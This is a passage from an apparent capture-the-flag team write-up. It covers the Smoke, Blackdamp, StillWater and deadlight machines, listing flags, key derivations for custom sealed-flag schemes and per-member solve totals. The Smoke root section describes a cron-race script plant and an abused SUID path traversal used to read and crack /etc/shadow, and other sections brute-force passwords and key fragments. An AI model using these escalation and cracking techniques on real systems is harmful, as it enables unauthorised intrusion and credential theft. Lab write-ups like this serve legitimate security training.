**Conclusion.** The record store wasn't lore — it *was the wordlist*, and the loud plaintext creds were the decoys.

**Flag:** `Null0rigin{the_wordlist_was_the_target_all_along}`

## Smoke — Root — 250 — *solved by ednk*

**Privilege escalation.** From the `assay` shell, the `lamp-rollup` cron briefly makes its spool directory **writable every minute** and then executes tally files as **`clerk`** — plant a small script during that window for a `clerk` shell. Next, the SUID **`lampcheck`** binary mishandles repeated `../` components (a double-encoded path traversal, *"stripping once ≠ not there"*), so it can be abused to read `/etc/shadow`; crack the root hash and `su`. (Two distinct bugs — the cron race and the traversal — are both needed.)

**Root flag.** `root.txt` is sealed with the local **`SMKSEAL1`** format (`"SMKSEAL1"` + 4-byte salt = `sha256(flag)[:4]` + `len(u16)` + ciphertext; cipher = SHA256-CTR with `keymat = "fragA:fragB:password"`). Two fragments needed by `unseal` are hidden in the clerk notes among ordinary-looking office records; supplying both to the unseal helper opens the file.

**Reproduce.** cron race on `lamp-rollup` spool → `clerk` shell → abuse SUID `lampcheck` `../` traversal → read/crack `/etc/shadow` → root → feed the two clerk-note fragments to `unseal` on `root.txt`.

**Conclusion / chain link.** This root flag's SHA256 is the **chain key into Blackdamp root**.

**Flag:** `Null0rigin{two_figures_off_a_payroll_sheet}`

## Blackdamp — User — 400 — *solved by ftps3rver*

`unseal --user F` derives key `SHA256("blackdamp-user|"+F)`; `F` is the fragment where `sha256(F)==b874211d…a04b`, i.e. **`F = bda5c910`** from `/home/assay/.assay/seal-frag-B.txt`. Decrypt `/var/lib/assay/user.txt.sealed` (BDSEAL SHA256-CTR: `ks(i)=SHA256(key‖le32(i))`, `pt=ct⊕ks`).

**Reproduce.** Read `F=bda5c910` → `key=SHA256("blackdamp-user|"+F)` → BDSEAL-decrypt `user.txt.sealed`.

**Flag:** `Null0rigin{the_seam_number_was_two_of_the_four}`

## Blackdamp — Root — 400 — *solved by ednk*

Key `SHA256("blackdamp-seal|"+seed+"|"+chainkey)`. `seed = fragA+fragB+fragC = ea3f9e5b + bda5c910 + f4c01df2` (verify `sha256(seed)==bce7dc4b…`). fragB/fragC are on disk; **fragA `ea3f9e5b` was brute-forced 2³² against the seed hash** (12-core, ~10 min) — the `.7z` it hid in never needed opening. `chainkey` = Smoke root. Decrypt `/root/root.txt.sealed`.

**Reproduce.** Recover fragB/fragC on disk → brute fragA (2³²) vs `sha256(seed)` → assemble seed → `key=SHA256("blackdamp-seal|"+seed+"|"+chainkey)` with chainkey = Smoke root → BDSEAL-decrypt `root.txt.sealed`.

**Flag:** `Null0rigin{you_paid_for_every_candidate}`

## StillWater — User — 600 — *solved by ftps3rver*

Shared 24-byte **seed** = FRAG1+FRAG2+FRAG3 = `e94837b2225e9dbf + b685186c466bd2ce + d70f14ea164169a1` (verify `sha256("stillwater-seed-v1"+seed)==efa3a133…`). **FRAG2** = the one `levels.dat` record with a **negative level** (a float can't go below the sill — seq 3870). User key = `SHA256("stillwater-user-v1"+f1+f2)`; keystream `SHA256(K+"ks"+be32(ctr))`, `pt=ct⊕ks`.

**Reproduce.** Recover FRAG1/2/3 (FRAG2 = negative `levels.dat` record) → `key=SHA256("stillwater-user-v1"+f1+f2)` → decrypt user seal.

**Flag:** `Null0rigin{you_rode_the_cycle_instead_of_reading_it}`

## StillWater — Root — 600 — *solved by ftps3rver*

Root key = `SHA256("stillwater-seal-v1" ‖ password ‖ chainkey ‖ seed24)` — unlike Blackdamp, the **root password is in the key** and must be recovered. Credential standard rev.7 (`root = holder wellflash, seam 52, staff`): base token = holder surname → `Wellflash` + `52` + brute `shot(000-999) × marker([!@#$%&])` = 6000 candidates validated against the seal tag → **`Wellflash52199%`**. `chainkey` = Blackdamp root. `root.seal` (91 B, no magic) = `ct[59] ‖ tag[32]`, `tag = SHA256(key+"tag"+pt)`.

**Reproduce.** Derive `Wellflash52` + brute 6000 `shot×marker` vs the seal tag → `Wellflash52199%` → `key=SHA256("stillwater-seal-v1"‖pw‖chainkey‖seed24)` (chainkey = Blackdamp root) → decrypt `root.seal`.

**Flag:** `Null0rigin{the_sump_empties_on_its_own_schedule_not_yours}`

## deadlight — User — 1000 — *solved by ftps3rver*

Plaintext (not sealed) at `/var/lib/lamp/user.txt` — just read it after the foothold.

**Reproduce.** `cat /var/lib/lamp/user.txt`.

**Flag:** `Null0rigin{the_lamp_told_you_by_going_out}`

## deadlight — Root — 1000 — *solved by ftps3rver*

`deadlight --relight`, key `K = SHA256(chain ‖ rootpw ‖ seal ‖ seed)`; keystream is a **hash chain** (`ks[0]=SHA256(K‖"deadlight-seal")`, `ks[n]=SHA256(ks[n-1]‖"deadlight-seal")`). Each of the 4 inputs is committed in `/etc/lamp/bench.conf`:
- `chain` = StillWater root ✓
- `rootpw = Chimneystem54449&` (cred-standard rev.9: root=holder chimneystem seam54 staff; brute vs roothash) ✓
- `seal = F0rdb0th0m94280#` (holder fordbothom seam94 **contractor** → leet(Cap)+seam+shot+marker; brute vs sealhash256) ✓
- `seed = C4WSWUHX6IPRF4SZ` = fragA(6) + `HX6IP` + `RF4SZ`; fragB/fragC on disk, **fragA `C4WSWU` brute-forced 32⁶** vs seedhash `4f971d4e…892b024` (~2 min). ✓

Decrypt `/etc/lamp/sealed.bin` (50 B, no magic). This is the final machine — no chain-key consumer after it.

**Reproduce.** Confirm each input against its `bench.conf` commitment (brute `rootpw`, `seal`, and seed `fragA` as needed) → `K=SHA256(chain‖rootpw‖seal‖seed)` → hash-chain keystream → XOR-decrypt `sealed.bin`.

**Conclusion (whole chain).** A sealed flag means *reverse the sealer*, not *grep harder*; every seal is SHA256-keystream XOR whose key is a small tuple of on-disk fragments + a credential-standard password; runtime gates guard only the binary; and each root's SHA256 == the next box's chain key, a free zero-cost oracle. **Chain complete 4/4.**

**Flag:** `Null0rigin{a_deadlight_is_a_reading_not_a_failure}`

---

## Per-member totals

- **ftps3rver (17):** SafeLight, moire, UnderTone, Pentimento, Winnow, Mordant, quietus, Bindery, Daybook, CTFCeption, The Forgotten Alias, Sanity-1, Blackdamp-User, StillWater-User, StillWater-Root, deadlight-User, deadlight-Root
- **ednk (9):** Smoke-User, Smoke-Root, Blackdamp-Root, Shadow Gate, Carrier, Feedback From, Sanity-2, Handoff, Sanity-3
- **AlatBekam (2):** driftwood, NightShift
- **foursaken (2):** The Forbidden Six, Welcome

*Only "Feedback From" we did not make the writeup because its only fill the feedback and then get the flag*
